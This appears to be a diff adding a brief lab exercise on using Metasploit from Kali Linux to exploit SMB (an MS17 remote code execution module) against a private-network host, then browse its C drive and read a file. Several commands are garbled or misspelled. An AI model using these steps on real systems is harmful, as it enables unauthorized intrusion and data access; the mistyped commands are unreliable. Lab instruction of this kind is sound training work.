@@ -1,0 +1,21 @@
+Aim:- Using metasploit to exploit(kali linux)
+
+Steps:-
+1) Open the kali linux terminal to enter the command.
+2) Scan for the vulnerabilities in the system to be
+hacked by runnig the command.
+ sudo nmap -sS - A - 10.1.17.125
+3) Check whether the port 445 is open or not.IF yes then type the below command.
+	nmap--script smb-vuh* -p 445 10.1.17.125
+4) sudo console
+5) search smb
+6) search smb ms17
+7) use 1 (use the one which has Remote windows code execution)
+8) Show targets 
+9) Show options
+10) set RHOSTS 10.1.17.125
+11) exploit
+12) The systems access has been gained, now change the working directory to C drive (C:1)
+13) Now, check the contents of C Drive by running 'is' command.
+14) Change the directory by running cd command "cd Neehit"
+15) Now, concatenet the file present in 'Neehit ' folder to display the output.
